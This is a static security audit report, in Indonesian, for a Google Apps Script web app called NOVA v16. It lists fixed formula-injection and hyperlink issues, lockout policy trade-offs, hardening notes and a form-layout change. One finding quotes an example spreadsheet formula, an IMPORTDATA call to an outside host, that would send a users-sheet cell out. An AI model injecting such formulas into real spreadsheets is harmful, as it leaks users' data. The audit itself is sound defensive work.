# Audit Keamanan NOVA v16 (statis, sumber saja)

Cakupan: backend/Code.gs, backend/dcp.gs, seluruh JS frontend utama, index.html, sw.js, appsscript.json.
Tidak ada kode dijalankan terhadap Google Sheets/Drive/endpoint produksi. Tes dijalankan hanya dengan mock lokal.

## Diperbaiki di paket ini (perilaku normal tidak berubah)
1. **Injeksi rumus lewat `kind` foto AC** (Code.gs `addPhotos_` -> `photoRow_` -> `putRows_`, sheet FOTO_AC kolom C belum berformat teks).
   Teknisi dapat mengirim `kind` seperti `=IMPORTDATA("https://host/"&USERS!G2)` (maks. 60 karakter).
   Perbaikan: `safeTxt_()` pada `photoRow_`. **Status: jalur kode terbukti; efek di Sheets belum diuji langsung** (lihat "Validasi oleh pemilik").
2. **Teks pengguna menjadi tautan aktif di sheet arsip/rebuild** (`putRows_` mengubah `=HYPERLINK("url","label")` buatan pengguna).
   Perbaikan: `rowSafe_()` pada jalur `arsipSatu_` dan `rebuildMirrors_`, dan regex `putRows_` kini hanya menerima URL `https://drive.google.com/`.

## Tidak diubah sengaja (keputusan desain Anda / perlu persetujuan)
- **Kunci akun permanen setelah 10 password salah** (diuji `test_auth.js` sebagai kebutuhan). **Update: role ADMIN kini dikecualikan dari blokir** (keputusan pemilik; salah password Admin hanya ditunda 1 detik). Untuk akun non-Admin konsekuensinya tetap: orang tanpa login dapat mengunci akun mereka; pesan login membedakan username yang ada/tidak; `failCount` tanpa LockService dapat kalah balapan. Opsi: kunci sementara 15 menit, pesan seragam, kunci di sekitar update `failCount`. Mengubahnya mengubah kebijakan, jadi tidak saya terapkan.
- `PUBLIC_PHOTOS=true`: foto laporan/tanda tangan berupa tautan "siapa pun dengan tautan".

## Catatan hardening (bukan celah terbukti)
- `logout` tidak mencabut token (berlaku s.d. 14 hari; idle 30 menit ditegakkan server).
- Hash password: SHA-256 x1000 buatan sendiri (lemah bila hash bocor, mis. via temuan 1).
- `index.html` tanpa CSP; token di localStorage. `sw.js` memuat OneSignal SDK dari CDN tanpa SRI.
- `route_`: `H[q.action]` menerima nama prototipe (`constructor`) -> hanya error server, butuh token.
- `filmrep_save`: Teknisi dapat mengisi `createdBy` dengan nama lain.

## Diperiksa dan tampak aman
Allowlist role di `route_`, kepemilikan di `rep_save`/`photo_*`, handler Admin, modul DCP, `esc()` pada titik `innerHTML` utama, `cellSafe_` pada `add_`/`upd_`, validasi magic-byte gambar, rahasia di Script Properties.

## Belum diperiksa mendalam
`pdfkit.js`, `drafts.js`, `multi-item.js`, `notify.js`, `ux.js`, `loader.js`, `dcp.gs` bagian bawah, tes browser.

## Validasi oleh pemilik (aman, di salinan spreadsheet)
Sebelum deploy: di SALINAN spreadsheet uji, kirim foto AC dengan `kind` = `=1+1` memakai kode LAMA; bila FOTO_AC kolom C menampilkan `2`, celah terkonfirmasi. Dengan kode baru harus tampil teks ` =1+1`.

## Bukti pengujian
`tests/test_fix_formula.js` 7/7 lulus; seluruh tes non-browser bawaan lulus. Tes browser (Playwright) tidak dijalankan.

## Perubahan tampilan (bukan keamanan): penataan formulir Daily Monitoring AC
- Berkas: `nova-ds.css` (blok baru di akhir, hanya memengaruhi `#acs` dan `.acbar`), `index.html` (`nova-ds.css?v=17`), `sw.js` (`CACHE_VERSION = nova-v16-ac-form`). Tidak ada perubahan markup/JS/logika simpan.
- Satu kartu per area dengan nomor otomatis; tombol hapus sejajar pemilih area; Merk | Kondisi | Suhu satu baris;
  "AC Eror" dan tombol Galeri/Kamera satu baris di dasar kartu (checkbox yang sebelumnya melebar kini ukuran normal);
  kartu merah saat AC Eror dicentang; tombol "+ Tambah area" dan penghitung foto sejajar. Mode terang/gelap dan ponsel diperiksa.
